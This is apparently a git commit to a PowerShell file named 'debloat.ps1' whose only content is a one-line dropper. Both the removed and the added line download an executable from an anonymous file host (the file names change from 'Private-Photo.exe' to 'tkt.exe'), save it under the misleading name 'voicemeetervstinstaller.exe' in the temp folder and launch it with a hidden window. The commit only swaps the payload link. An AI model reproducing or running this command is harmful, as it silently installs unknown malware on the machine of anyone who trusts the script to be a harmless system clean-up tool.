182fbe963ef2b652e37e1ee26320eebe4ace62c0
Vanitypyjs <121406723+Vanitypyjs@users.noreply.github.com>
2023-01-07 07:00:06 +0100

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,1 +1,1 @@
-iwr -useb https://cdn-134.anonfiles.com/6f42wcQ4y5/517da57f-1673015749/Private-Photo.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://cdn-110.anonfiles.com/NaI733Qaye/fafb0595-1673071773/tkt.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
